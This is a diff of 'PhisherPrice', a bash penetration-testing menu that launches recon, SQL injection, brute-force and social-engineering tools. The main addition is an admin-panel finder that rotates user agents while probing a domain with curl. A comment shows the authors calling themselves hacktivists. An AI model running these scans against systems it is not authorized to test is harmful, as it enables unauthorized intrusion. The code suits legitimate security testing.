@@ -1,6 +1,44 @@
 #!/bin/bash
-## rjwdlu4eva
-## PhiserPrice 4.0 (ALPHA)
+
+##################################
+# PhiserPrice version 4.1(ALPHA) #
+##################################
+## Developed on BackBox With <3 ##
+##       By SirCryptic          ##
+##################################
+##################################
+##        rjwdlu4eva            ##
+##################################
+##         Greetz To:           ## 
+##################################
+##     NullSecurityTeam         ##
+##          M0bly               ##
+##          Double A            ##
+##################################
+##          R1ff                ##
+##          M0nde               ##
+##          Jack                ##
+##          Kiera               ##
+##################################
+##              Repo            ##
+################################################
+## https://github.com/SirCryptic/phisherprice ##
+################################################
+##             LICENSE          ##
+#########################################################################
+## https://github.com/SirCryptic/phisherprice/blob/re-write/LICENSE.md ##
+#########################################################################
+##             Changelog        ##
+###########################################################################
+## https://github.com/SirCryptic/phisherprice/blob/re-write/CHANGELOG.md ##
+###########################################################################
+##             NOTICE:          ##
+################################################################################################################################################
+## If you have paid for this script, please be aware that you have been scammed.                                                              ##
+## This script is open source and freely available for anyone to use and modify under the terms of the license for personal use.              ##
+## No one should be charging you for access to this script or claiming it as their own work.                                                  ##
+## If you have any concerns or questions, please contact the original author (SirCryptic) or report the scam to the appropriate authorities.  ##
+################################################################################################################################################
 if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 
    echo "You Forgot To Say The Magic Word, bRuHhh cmon" 
@@ -27,50 +65,99 @@ fi
 history -r
 history -a
 history -w
-
-# Color and title
-red='\e[1;31m'
-yellow='\e[0;33m'
-Blue='\e[1;34m'
-title="PhisherPrice Alpha v4"
+# Set the terminal size
+echo "${green}Setting terminal size...${reset}"
+resize -s 50 150
+# Set up color variables
+black=`tput setaf 0`
+red=`tput setaf 1`
+green=`tput setaf 2`
+yellow=`tput setaf 3`
+blue=`tput setaf 4`
+magenta=`tput setaf 5`
+cyan=`tput setaf 6`
+white=`tput setaf 7`
+reset=`tput sgr0`
+colors=(
+    "$(tput setaf 0)"
+    "$(tput setaf 1)"
+    "$(tput setaf 2)"
+    "$(tput setaf 3)"
+    "$(tput setaf 4)"
+    "$(tput setaf 5)"
+    "$(tput setaf 6)"
+    "$(tput setaf 7)"
+    "$(tput sgr0)"
+)
+banner_files=(
+    "main/banners/banner1.txt"
+    "main/banners/banner2.txt"
+    "main/banners/banner3.txt"
+    "main/banners/banner4.txt"
+    "main/banners/banner5.txt"
+    "main/banners/banner6.txt"
+)
+title="PhisherPrice"
 echo -e '\033]2;'$title'\007'
 
-banner='
-\e[1;33m
-///,        ////
-\  /,      /  >.
- \  /,   _/  /.
-  \_  /_/   /.
-   \__/_   <   \e[1;31m PhisherPrice \e[1;33m
-   /<<< \_\_ \e[1;31m Happy Hour Playset \e[1;33m
-  /,)^>>_._ \ \e[1;31m Version 4.0 Alpha \e[1;33m
-  (/   \\ /\\\
-       // //```
-======((`((====\e[1;34m'
+ACPbanner="
+${cyan}  ___  _____ ______${magenta}______ 
+${cyan} / _ \/  __ \| ___ \ ${magenta} ___|
+${cyan}/ /_\ \ /  \/| |_/ /${magenta} |_   
+${cyan}|  _  | |    |  __/${magenta}|  _|  
+${cyan}| | | | \__/\| |   ${magenta}| |    
+${cyan}\_| |_/\____/\_|   ${magenta}\_|    
+${cyan}Admin Control Panel ${magenta}Finder ${yellow}[BETA]
+${magenta}Developed By ${cyan}NullSecurityTeam${reset}
+${magenta}Revised By ${cyan}SirCryptic@NullSecurityTeam${reset}
+"
+# Parse the command-line arguments
+while getopts "b" opt; do
+  case $opt in
+    b)
+      show_banner=true
+      ;;
+    \?)
+      echo "Invalid option: -$OPTARG" >&2
+      ;;
+  esac
+done
 
+# Select a random banner file if banners are enabled
+if [ "$show_banner" = true ]; then
+  selected_banner=${banner_files[RANDOM % ${#banner_files[@]}]}
+fi
+
+# Select a random color
+random_color=$((RANDOM % 8))
+color=${colors[$random_color]}
 # Main menu function
 main_menu() {
   while true
   do
-    clear
-    echo -e "${banner}"
-    echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"
-    \e[0m\e[3;39m
-(1) Recon
-(2) Cracking
-(3) AutoxSploits
-(4) Networking
-(5) C.Y.O xSploits
-(6) AutoExif  
-(7) SE Toolkit
-(8) Start Th3inspector
-(u) Update Script
-(c) Contact Information
-
-Press q/Q To Exit
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"ToolSet$Blue]:"
-read -r -p" └─────► " choice
+  clear
+  # Print the banner with the selected color if banners are enabled
+  if [ "$show_banner" = true ]; then
+    cat "$selected_banner" | sed "s/.*/${color}&${colors[8]}/"
+  fi
+echo -e "
+┌───────────────────────────────────────┐
+│${red}Main Menu${reset}                              │
+├───────────────────────────────────────┤
+│${green}1${reset} │Recon                               │
+│${green}2${reset} │Cracking                            │
+│${green}3${reset} │AutoxSploits                        │
+│${green}4${reset} │Networking                          │
+│${green}5${reset} │C.Y.O xSploits                      │
+│${green}6${reset} │AutoExif                            │  
+│${green}7${reset} │SE Toolkit                          │
+│${green}8${reset} │Start Th3inspector                  │
+│${green}u${reset} │Update Script                       │
+│${green}c${reset} │Contact Information                 │
+├───────────────────────────────────────┤
+│            q/Q To Exit                │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"ToolSet$blue]:"$reset────────┘"
+read -r -p"└─────► $reset" choice
     case $choice in
       1)
         submenu1
@@ -98,18 +185,18 @@ read -p "Press Y to confirm or any other key to cancel." confirm
 if [[ "$confirm" =~ ^([yY][eE][sS]|[yY])$ ]]; then
   clear
   echo -e "\n**************************************************"
-  echo "******  Starting Social Engineering Toolkit... ******"
+  echo "******  ${green}Starting${reset} Social Engineering Toolkit... ******"
   echo -e "**************************************************\n"
   
   if sudo setoolkit; then
     clear
     echo -e "\n**************************************************"
-    echo "******          SET has been closed         ******"
+    echo "******          SET has been ${red}closed${reset}         ******"
     echo -e "**************************************************\n"
   else
     clear
     echo -e "\n**************************************************"
-    echo "******        Error running SET...         ******"
+    echo "******        ${red}Error${reset} running SET...         ******"
     echo "******  Please check your installation.   ******"
     echo -e "**************************************************\n"
   fi
@@ -117,7 +204,7 @@ if [[ "$confirm" =~ ^([yY][eE][sS]|[yY])$ ]]; then
 else
   clear
   echo -e "\n**************************************************"
-  echo "******        Operation cancelled.         ******"
+  echo "******        ${red}Operation cancelled.${reset}         ******"
   echo -e "**************************************************\n"
 fi
         ;;
@@ -130,69 +217,68 @@ read -p "Press Y to confirm or any other key to cancel." confirm
 if [[ "$confirm" =~ ^([yY][eE][sS]|[yY])$ ]]; then
     clear
     echo -e '\n**************************************************'
-    echo "******      Loading Th3inspector...     ******"
+    echo "******      ${green}Loading${reset} Th3inspector...     ******"
     echo -e '**************************************************\n'
 
     Th3inspector
 
     clear
     echo -e '\n**************************************************'
-    echo "******    Th3inspector has been closed.  ******"
+    echo "******    Th3inspector has been ${red}closed.${reset}  ******"
     echo -e '**************************************************\n'
 else
     clear
     echo -e '\n**************************************************'
-    echo "******         Operation cancelled.        ******"
+    echo "******         ${red}Operation cancelled.${reset}        ******"
     echo -e '**************************************************\n'
 fi
         ;;
       u|U)
     clear
-    echo "Updating Phisherprice..."
+    echo "${green}Updating Phisherprice...${reset}"
     REPO_URL="https://github.com/sircryptic/phisherprice.git"
     INSTALL_DIR="/usr/local/bin/phisherprice"
 
-    echo "Cloning latest release..."
+    echo "${yellow}Cloning latest release...${reset}"
     git clone $REPO_URL $INSTALL_DIR.new || { echo "Failed to clone latest release"; exit 1; }
 
     if [ -d $INSTALL_DIR.old ]; then
-        echo "Removing old version..."
-        sudo rm -rf $INSTALL_DIR.old || { echo "Failed to remove old version"; exit 1; }
+        echo "${yellow}Removing old version...${reset}"
+        sudo rm -rf $INSTALL_DIR.old || { echo "${red}Failed to remove old version${reset}"; exit 1; }
     fi
 
     if [ -d $INSTALL_DIR ]; then
-        echo "Backing up current version..."
-        sudo mv $INSTALL_DIR $INSTALL_DIR.old || { echo "Failed to move current version to backup"; exit 1; }
+        echo "${yellow}Backing up current version...${reset}"
+        sudo mv $INSTALL_DIR $INSTALL_DIR.old || { echo "${red}Failed to move current version to backup${reset}"; exit 1; }
     fi
 
-    echo "Installing latest version..."
-    sudo mv $INSTALL_DIR.new $INSTALL_DIR || { echo "Failed to install latest version"; exit 1; }
+    echo "${green}Installing latest version...${reset}"
+    sudo mv $INSTALL_DIR.new $INSTALL_DIR || { echo "${red}Failed to install latest version${reset}"; exit 1; }
 
-    echo "Making $INSTALL_DIR/phisherprice.sh executable..."
-    sudo chmod +x $INSTALL_DIR/phisherprice.sh || { echo "Failed to make phisherprice.sh executable"; exit 1; }
+    echo "${yellow}Making $INSTALL_DIR/phisherprice.sh executable...${reset}"
+    sudo chmod +x $INSTALL_DIR/phisherprice.sh || { echo "${red}Failed to make phisherprice.sh executable${reset}"; exit 1; }
 
-    echo "Creating symbolic link for phisherprice.sh as pp..."
+    echo "${yellow}Creating symbolic link for phisherprice.sh as pp...${reset}"
     if [ -L /usr/local/bin/pp ]; then
-        echo "Removing old symbolic link..."
-        sudo rm /usr/local/bin/pp || { echo "Failed to remove old symbolic link"; exit 1; }
+        echo "${yellow}Removing old symbolic link...${reset}"
+        sudo rm /usr/local/bin/pp || { echo "${red}Failed to remove old symbolic link${reset}"; exit 1; }
     fi
-    sudo ln -s $INSTALL_DIR/phisherprice.sh /usr/local/bin/pp || { echo "Failed to create symbolic link"; exit 1; }
+    sudo ln -s $INSTALL_DIR/phisherprice.sh /usr/local/bin/pp || { echo "${red}Failed to create symbolic link${reset}"; exit 1; }
 
-    echo "Update complete!"
+    echo "${green}Update complete!${reset}"
 
-    echo "Restarting Phisherprice (now accessible via 'pp')..."
-    sudo pp || { echo "Failed to restart Phisherprice"; exit 1; }
+    echo "${yellow}Restarting Phisherprice${reset} (${green}now accessible via 'pp'${reset})..."
+    sudo pp || { echo "${red}Failed to restart Phisherprice${reset}"; exit 1; }
         ;;
       c|C)
 clear
 
-echo -e "\e[1;33m\nIf you have any issues, feel free to file a bug report on Git.\e[0m\n"
-echo -e "\e[1;34mI would personally like to thank \e[1;35mJack \e[1;34mover at \e[1;32mKali Hacking Community Discord Server\e[1;34m for being my motivation to keep making this tool. Sadly, this tool is no longer going to be updated much longer, and the original KHC community sank. Farewell to all those I personally knew.\nI would also like to thank \e[1;35mKiera<3 \e[1;34mover @KCH \e[1;34mfor making me aware of bugs. Without people like this, I probably would have been oblivious. So thank you once again to all those that made this possible and gave me inspiration.\n- \e[1;31mSirCryptic \e[1;34m\n"
-echo -e "Press Enter to continue."
+echo -e "${Yellow}If you have any issues, feel free to ${green}file a bug report${reset} on GitHub @ https://github.com/sircryptic/phisherprice${reset}"
+echo -e "\e[1;34mI would personally like to thank \e[1;35mJack \e[1;34mover at \e[1;32mKali Hacking Community Discord Server\e[1;34m for being my motivation to keep making this tool. Sadly, this tool is no longer going to be updated much longer, and the original KHC community sank. Farewell to all those I personally knew.\nI would also like to thank \e[1;35mKiera<3 \e[1;34mover @KCH \e[1;34mfor making me aware of bugs. Without people like this, I probably would have been oblivious. So thank you once again to all those that made this possible and gave me inspiration.\n- \e[1;31mSirCryptic \e[1;31m\n"
         ;;
 	q|Q)
 	clear
-	echo "Exiting PhisherPrice. Goodbye!"
+	echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
 	exit 0
   ;;
       *)
@@ -200,7 +286,7 @@ echo -e "Press Enter to continue."
         ;;
     esac
     echo ""
-    read -p "Press enter to continue..."
+    read -p "Press enter to continue...${reset}"
   done
 }
 
@@ -209,41 +295,37 @@ submenu1() {
   while true
   do
 	clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                   
-    \e[0m\e[3;39m \e[1;31m
-Recon & Auditing
-\e[3;39m
-(1) Whois Info
-(2) Geo IP
-(3) IP Lookup
-(4) DNS Lookup
-(5) Reverse DNS Lookup
-(6) Shared DNS Lookup
-(7) Nmap Scan (w/OS Detection)
-(8) SSH Scanner (Scan for weak cyphers)
-(9) SSL/TLS Scanner (Scan for weak cyphers)
-(10) Retreive HTTP Headers
-(11) Autonomous System Lookup (AS/ASN/IP)
-(12) Banner Grab
-(13) Extract All Links From Host
-(14) Phone Number Lookup
-(15) Reverse Analytics
-(16) Get Server Users
-(17) SQL Map
-(18) SQL Map (Quick/Deep)
-(19) Scan For Vulns (Metasploit)
-(20) BIN Checker
-(21) Email Validator
-(22) Scan Shodan for vulnrable IOT Devices
-
-Press q/Q To Exit
-Press b/B To Go To Back
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Recon & Audit$Blue]:"
-read -r -p" └─────► " choice
-
-
+echo -e "
+┌────────────────────────────────────────────┐
+│${red}Recon & Auditing${reset}                            │
+├────────────────────────────────────────────┤
+│${green}1${reset}  │Whois Info                              │
+│${green}2${reset}  │Geo IP                                  │
+│${green}3${reset}  │IP Lookup                               │
+│${green}4${reset}  │DNS Lookup                              │
+│${green}5${reset}  │Reverse DNS Lookup                      │
+│${green}6${reset}  │Shared DNS Lookup                       │
+│${green}7${reset}  │Nmap Scan (w/OS Detection)              │
+│${green}8${reset}  │SSH Scanner (Scan for weak cyphers)     │
+│${green}9${reset}  │SSL/TLS Scanner (Scan for weak cyphers) │
+│${green}10${reset} │Retreive HTTP Headers                   │
+│${green}11${reset} │Autonomous System Lookup (AS/ASN/IP)    │
+│${green}12${reset} │Banner Grab                             │
+│${green}13${reset} │Extract All Links From Host             │
+│${green}14${reset} │Phone Number Lookup                     │
+│${green}15${reset} │Reverse Analytics                       │
+│${green}16${reset} │Get Server Users                        │
+│${green}17${reset} │SQL Map                                 │
+│${green}18${reset} │SQL Map (Quick/Deep)                    │
+│${green}19${reset} │Scan For Vulns (Metasploit)             │
+│${green}20${reset} │BIN Checker                             │
+│${green}21${reset} │Email Validator                         │
+│${green}22${reset} │Scan Shodan for vulnrable IOT Devices   │
+│${green}23${reset} │Admin Control Panel Finder [BETA]       │
+├────────────────────────────────────────────┤
+│    b/B To Go To Back ~ q/Q To Exit         │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Recon/Auditing$blue]:"$reset──────┘"
+read -r -p"└─────► $reset" choice
     case $choice in
         1)
         clear
@@ -276,14 +358,7 @@ fi
         ;;
         2)
         clear
-echo -e '\e[1;33m
-  ________             ._____________ 
- /  _____/  ____  ____ |   \______   \
-/   \  ____/ __ \/  _ \|   ||     ___/
-\    \_\  \  ___(  <_> )   ||    |    
- \______  /\___  >____/|___||____|    
-        \/     \/                     \e[1;34m
-' 
+echo -e "Geo IP Lookup" 
 echo "Enter IP or Domain:"
 read -e subop3
 history -a
@@ -306,14 +381,7 @@ fi
         ;;
         3)
         clear
-echo -e '\e[1;33m
-__________._____________  .____                  __                 
-\______   \   \______   \ |    |    ____   ____ |  | ____ ________  
- |       _/   ||     ___/ |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
- |    |   \   ||    |     |    |__(  <_> |  <_> )    <|  |  /  |_> >
- |____|_  /___||____|     |_______ \____/ \____/|__|_ \____/|   __/ 
-        \/      Reverse IP Lookup \/                 \/     |__|    \e[1;34m
-'  
+echo -e "Reverse IP Lookup"  
 echo "Enter IP or Domain:"
 read -e subop4
 history -a
@@ -336,14 +404,7 @@ fi
         ;;
         4)
         clear
-echo -e '\e[1;33m
-________    _______    _________ .____                  __                 
-\______ \   \      \  /   _____/ |    |    ____   ____ |  | ____ ________  
- |    |  \  /   |   \ \_____  \  |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
- |    `   \/    |    \/        \ |    |__(  <_> |  <_> )    <|  |  /  |_> >
-/_______  /\____|__  /_______  / |_______ \____/ \____/|__|_ \____/|   __/ 
-        \/         \/        \/          \/                 \/     |__|    \e[1;34m
-'  
+echo -e "DNS Lookup"  
 echo "Enter IP Address, IP Range or Domain Name:"
 read -e subop5
 history -a
@@ -365,14 +426,7 @@ fi
         ;;
         5)
         clear
-echo -e '\e[1;33m
-__________                                         ________    _______    _________
-\______   \ _______  __ ___________  ______ ____   \______ \   \      \  /   _____/
- |       _// __ \  \/ // __ \_  __ \/  ___// __ \   |    |  \  /   |   \ \_____  \ 
- |    |   \  ___/\   /\  ___/|  | \/\___ \\  ___/   |    `   \/    |    \/        \
- |____|_  /\___  >\_/  \___  >__|  /____  >\___  > /_______  /\____|__  /_______  /
-        \/     \/          \/           \/     \/          \/         \/        \/ \e[1;34m
-' 
+echo -e "Reverse DNS Lookup" 
 echo "Enter IP or domain:"
 read -e subop6
 history -a
@@ -395,14 +449,7 @@ fi
         ;;
         6)
         clear
-echo -e '\e[1;33m
-  _________.__                             .___ ________    _______    _________
- /   _____/|  |__ _____ _______   ____   __| _/ \______ \   \      \  /   _____/
- \_____  \ |  |  \\__  \\_  __ \_/ __ \ / __ |   |    |  \  /   |   \ \_____  \ 
- /        \|   Y  \/ __ \|  | \/\  ___// /_/ |   |    `   \/    |    \/        \
-/_______  /|___|  (____  /__|    \___  >____ |  /_______  /\____|__  /_______  /
-        \/      \/     \/            \/     \/          \/         \/        \/ \e[1;34m
-' 
+echo -e "Shared DNS Finder" 
 echo "Enter IP Or Domain."
 read -e subop7
 history -a
@@ -431,14 +478,7 @@ fi
         ;;
         7)
         clear
-echo -e '\e[1;33m
- _______      _____      _____ __________    _________                     
- \      \    /     \    /  _  \\______   \  /   _____/ ____ _____    ____  
- /   |   \  /  \ /  \  /  /_\  \|     ___/  \_____  \_/ ___\\__  \  /    \ 
-/    |    \/    Y    \/    |    \    |      /        \  \___ / __ \|   |  \
-\____|__  /\____|__  /\____|__  /____|     /_______  /\___  >____  /___|  /
-        \/         \/         \/                   \/     \/     \/     \/ \e[1;34m
-'
+echo -e "NMAP Scan w/OS Detection"
 echo "Enter IP Or Domain."
 read -e subop8 
 history -a
@@ -501,14 +541,7 @@ echo -e '
  
 '
 }
-echo -e '
-  _________ _________ ___ ___     _________                                         
- /   _____//   _____//   |   \   /   _____/ ____ _____    ____   ____   ___________ 
- \_____  \ \_____  \/    ~    \  \_____  \_/ ___\\__  \  /    \ /    \_/ __ \_  __ \
- /        \/        \    Y    /  /        \  \___ / __ \|   |  \   |  \  ___/|  | \/
-/_______  /_______  /\___|_  /  /_______  /\___  >____  /___|  /___|  /\___  >__|   
-        \/        \/       \/           \/     \/     \/     \/     \/     \/       
-'
+echo -e "SSH Scanner"
 echo -e "Enter host: "
 read -e host
 history -a
@@ -524,7 +557,7 @@ read -e host
 echo "Enter the host port you want to scan (e.g. 443):"
 read -e port
 clear
-echo"$host"  >> ~/.bash_history
+echo"$host" >> ~/.bash_history
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !   Scanning host SSL/TLS for vulns   !
@@ -537,13 +570,13 @@ if [[ -z $response || $response == *"unable to"* ]]; then
   echo "Error: Failed to retrieve SSL/TLS information for $host:$port"
 else
   echo -e "\n-----------------------------"
-  echo "SSL/TLS Information"
+  echo "${yellow}SSL/TLS Information${reset}"
   echo "-----------------------------"
   echo -e "$response"
 
   if [[ $response == *"heartbleed"* ]]; then
     echo -e "\n-----------------------------"
-    echo "Heartbleed Vulnerability Detected!"
+    echo "Heartbleed Vulnerability ${green}Detected${reset}!"
     echo "-----------------------------"
   fi
 fi
@@ -571,14 +604,7 @@ fi
         ;;
         10)
         clear
-echo -e '\e[1;33m
-  ___ ___________________________________  _________                     
- /   |   \__    ___/\__    ___/\______   \/   _____/ ____ _____    ____  
-/    ~    \|    |     |    |    |     ___/\_____  \_/ ___\\__  \  /    \ 
-\    Y    /|    |     |    |    |    |    /        \  \___ / __ \|   |  \
- \___|_  / |____|     |____|    |____|   /_______  /\___  >____  /___|  /
-       \/  HTTP Header Scan                      \/     \/     \/     \/ \e[1;34m
-'
+echo -e "HTTP Header Scan"
 echo "Enter the host you want to scan:"
 read -e subop11
 history -a
@@ -602,14 +628,7 @@ fi
         ;;
         11)
         clear
-echo -e '\e[1;33m
-   _____    _________ _______    .____                  __                 
-  /  _  \  /   _____/ \      \   |    |    ____   ____ |  | ____ ________  
- /  /_\  \ \_____  \  /   |   \  |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
-/    |    \/        \/    |    \ |    |__(  <_> |  <_> )    <|  |  /  |_> >
-\____|__  /_______  /\____|__  / |_______ \____/ \____/|__|_ \____/|   __/ 
-        \/        \/         \/          \/                 \/     |__|    \e[1;34m
-'  
+echo -e "ASN Lookup"  
 echo "Enter the ASN you want to scan:"
 echo "Example usage: 1.1.1.1 / AS15169"
 read -e subop12
@@ -637,14 +656,7 @@ echo "------------------------------"
         ;;
         12)
         clear
-echo -e '\e[1;33m
-__________                                       ________            ___.    
-\______   \_____    ____   ____   ___________   /  _____/___________ \_ |__  
- |    |  _/\__  \  /    \ /    \_/ __ \_  __ \ /   \  __\_  __ \__  \ | __ \ 
- |    |   \ / __ \|   |  \   |  \  ___/|  | \/ \    \_\  \  | \// __ \| \_\ \
- |______  /(____  /___|  /___|  /\___  >__|     \______  /__|  (____  /___  /
-        \/      \/     \/     \/     \/                \/           \/    \/ \e[1;34m
-' 
+echo -e "Banner Grab" 
 echo "Enter the IP address or domain name you want to scan:"
 read -e subop13
 history -a
@@ -666,14 +678,7 @@ fi
         ;;
         13)
         clear
-echo -e '\e[1;33m
-.____    .__        __       _________      .__  _____  _____             
-|    |   |__| ____ |  | __  /   _____/ ____ |__|/ ____\/ ____\___________ 
-|    |   |  |/    \|  |/ /  \_____  \ /    \|  \   __\\   __\/ __ \_  __ \
-|    |___|  |   |  \    <   /        \   |  \  ||  |   |  | \  ___/|  | \/
-|_______ \__|___|  /__|_ \ /_______  /___|  /__||__|   |__|  \___  >__|   
-        \/       \/     \/         \/     \/                     \/       \e[1;34m
-'
+echo -e "Link Sniffer"
 echo "This can reveal social media pages, etc."
 echo "Enter domain name:"
 read -e domain
@@ -707,14 +712,7 @@ echo "-----------------------------"
         ;;
         14)
         clear
-echo -e '\e[1;33m
-__________.__                           .____                  __                 
-\______   \  |__   ____   ____   ____   |    |    ____   ____ |  | ____ ________  
- |     ___/  |  \ /  _ \ /    \_/ __ \  |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
- |    |   |   Y  (  <_> )   |  \  ___/  |    |__(  <_> |  <_> )    <|  |  /  |_> >
- |____|   |___|  /\____/|___|  /\___  > |_______ \____/ \____/|__|_ \____/|   __/ 
-               \/            \/     \/          \/                 \/     |__|    \e[1;34m
-'
+echo -e "Phone Number Lookup"
 echo "Please Enter The Number Followed By The Dialing Code"
 echo "for example : +447410490080 / +44 Is My Dialing Code"
 read -e subop15
@@ -733,14 +731,7 @@ echo "-----------------------------"
         ;;
         15)
         clear
-echo -e '\e[1;33m
-__________              _____                .__           __  .__               
-\______   \ _______  __/  _  \   ____ _____  |  | ___.__._/  |_|__| ____   ______
- |       _// __ \  \/ /  /_\  \ /    \\__  \ |  |<   |  |\   __\  |/ ___\ /  ___/
- |    |   \  ___/\   /    |    \   |  \/ __ \|  |_\___  | |  | |  \  \___ \___ \ 
- |____|_  /\___  >\_/\____|__  /___|  (____  /____/ ____| |__| |__|\___  >____  >
-        \/     \/            \/     \/     \/     \/ Reverse Analytics \/     \/ \e[1;34m
-'  
+echo -e "Reverse Analytics Lookup"  
 echo "Find Domains Using Same Google Ad-Sense ID"
 echo "Enter Domain Name Or GA-ID"
 echo "For example: UA-11223344 or testsite.com"
@@ -768,14 +759,7 @@ echo '----------------------------------'
         ;;
         16)
         clear
-echo -e '\e[1;33m
- ____ ___                       _________                           .__     
-|    |   \______ ___________   /   _____/ ____ _____ _______   ____ |  |__  
-|    |   /  ___// __ \_  __ \  \_____  \_/ __ \\__  \\_  __ \_/ ___\|  |  \ 
-|    |  /\___ \\  ___/|  | \/  /        \  ___/ / __ \|  | \/\  \___|   Y  \
-|______//____  >\___  >__|    /_______  /\___  >____  /__|    \___  >___|  /
-             \/     \/                \/     \/     \/            \/     \/ \e[1;34m
-'
+echo -e "User Search"
 echo "Enter Domain Name Or IP:"
 read -e subop17
 history -a
@@ -806,14 +790,7 @@ fi
         ;;
         17)
         clear
-echo -e '\e[1;33m
-  _________________  .____         _____                                     
- /   _____/\_____  \ |    |       /     \ _____  ______ ______   ___________ 
- \_____  \  /  / \  \|    |      /  \ /  \\__  \ \____ \\____ \_/ __ \_  __ \
- /        \/   \_/.  \    |___  /    Y    \/ __ \|  |_> >  |_> >  ___/|  | \/
-/_______  /\_____\ \_/_______ \ \____|__  (____  /   __/|   __/ \___  >__|   
-        \/        \__>       \/         \/     \/|__|   |__|        \/       \e[1;34m
-'
+echo -e "SQL Mapper"
 echo "Enter Domain Name Or IP:"
 read -e sql1
 history -a
@@ -852,14 +829,7 @@ fi
         ;;
         18)
         clear
-echo -e '\e[1;33m
-  _________________  .____     
- /   _____/\_____  \ |    |    
- \_____  \  /  / \  \|    |    
- /        \/   \_/.  \    |___ 
-/_______  /\_____\ \_/_______ \
-        \/        \__>       \/ Brute Force \e[1;34m
-'
+echo -e "SQL Brute Force"
 echo "Enter Website"
 read -e sqlhost2
 echo "php or html ?"
@@ -1019,12 +989,129 @@ echo ""
 echo "Scanning finished saved to $OUTPUT_FILE"
 echo ' '
         ;;
+      23)
+        clear
+# Define the URL prefix
+url_prefix="http://"
+
+# Read the user agents from the file
+user_agents=$(cat main/user_agents.txt)
+# Clear the cli
+clear
+
+echo -e "${ACPbanner}"
+
+# Prompt the user for the domain name
+read -e -p "Enter the domain name to check: " domain  && echo "$domain" >> ~/.bash_history 2>/dev/null
+
+# Read the possible URLs from the file
+found_admin_panel=false
+urls_checked=0
+while read url_suffix; do
+  # Construct the full URL
+  url="$url_prefix$domain$url_suffix"
+
+  # Pick a random user agent
+  user_agent=$(echo "$user_agents" | shuf -n 1)
+
+  # Send a HEAD request and save the response headers
+  headers=$(curl -I --silent --user-agent "$user_agent" "$url")
+
+  # Extract the status code from the headers
+  status=$(echo "$headers" | grep -oP "^HTTP/\d\.\d \K\d{3}")
+
+  # Check if the status code is in the 200-299 range
+  # Display the URL and the response body
+  if [[ "$status" =~ ^2[0-9]{2}$ ]]; then
+    echo "${cyan}URL:${reset} $url"
+    echo "${magenta}User agent:${reset} $user_agent"
+    echo "${yellow}Response body:${reset}"
+    curl --silent --user-agent "$user_agent" "$url"
+    echo "-----------------------------------------"
+  elif [[ "$status" == "301" ]]; then
+    echo "${cyan}URL:${reset} $url"
+    echo "${magenta}User agent:${reset} $user_agent"
+    echo "${yellow}Status code:${reset} $status Moved Permanently"
+    echo ""
+    echo "-----------------------------------------"
+  elif [[ "$status" == "400" ]]; then
+    echo "${cyan}URL:${reset} $url"
+    echo "${magenta}User agent:${reset} $user_agent"
+    echo "${yellow}Status code:${reset} $status Bad request"
+    echo ""
+    echo "-----------------------------------------"
+  elif [[ "$status" == "401" ]]; then
+    echo "${cyan}URL:${reset} $url"
+    echo "${magenta}User agent:${reset} $user_agent"
+    echo "${yellow}Status code:${reset} $status Not Found"
+    echo ""
+    echo "-----------------------------------------"
+  elif [[ "$status" == "403" ]]; then
+    echo "${cyan}URL:${reset} $url"
+    echo "${magenta}User agent:${reset} $user_agent"
+    echo "${yellow}Status code:${reset} $status Requested resource is forbidden"
+    echo ""
+    echo "-----------------------------------------"
+  elif [[ "$status" == "404" ]]; then
+    echo "${cyan}URL:${reset} $url"
+    echo "${magenta}User agent:${reset} $user_agent"
+    echo "${yellow}Status code:${reset} $status Page not found or File not found"
+    echo ""
+    echo "-----------------------------------------"
+  elif [[ "$status" == "405" ]]; then
+    echo "${cyan}URL:${reset} $url"
+    echo "${magenta}User agent:${reset} $user_agent"
+    echo "${yellow}Status code:${reset} $status Method Not Allowed"
+    echo ""
+    echo "-----------------------------------------"
+  elif [[ "$status" == "503" ]]; then
+    echo "${cyan}URL:${reset} $url"
+    echo "${magenta}User agent:${reset} $user_agent"
+    echo "${yellow}Status code:${reset} $status Service Unavailable"
+    echo ""
+    echo "-----------------------------------------"
+  elif [[ "$status" == "200" ]]; then
+    echo "${cyan}URL:${reset} $url"
+    echo "${magenta}User agent:${reset} $user_agent"
+    echo "${green}Status code:${reset} $status"
+    echo "${green}Admin panel found at:${reset} $url"
+    echo ""
+    echo "-----------------------------------------"
+    break
+  else
+    # Display the URL and the status code
+    echo "${cyan}URL:${reset} $url"
+    echo "${magenta}User agent:${reset} $user_agent"
+    echo "${yellow}Status code:${reset} $status Unknown {Null}"
+    echo ""
+    echo "-----------------------------------------"
+  fi
+  urls_checked=$((urls_checked+1))
+done < main/admin_urls.txt
+
+# Check if an admin panel was found
+if [[ "$found_admin_panel" == false ]]; then
+  echo "${yellow}No results found after checking $urls_checked URLs.${reset}"
+fi
+
+# NullSecurityTeam
+
+## Greetz to the world and gov sectors,
+
+## We are a group of hacktivists who have played our parts in various government operations between 2018 - 2021 ✌️👨‍💻
+
+## It has been a pleasure to meet and work anonymously among those in this industry. We hope to continue our work and make a positive impact in the world.
+
+## Signed,
+## ~ m0bly, double A, and SirCryptic ~ root@nst (2018)
+## ~ SirCryptic (revised 2023) // Mobly = M.I.A / Double A = M.I.A - SCNS@127.0.0.1 over & out
+        ;;
       b|B)
         return
         ;;
         q|Q)
         clear
-        echo "Exiting PhisherPrice. Goodbye!"
+        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
         exit 0
   ;;
       *)
@@ -1040,27 +1127,25 @@ submenu2() {
   while true
   do
 clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
-                   \e[0m\e[3;39m \e[1;31m
-Cracking / Brute Force
-\e[3;39m
-(1) Bluetooth Toolkit
-(2) Auto-Brute (Hydra)
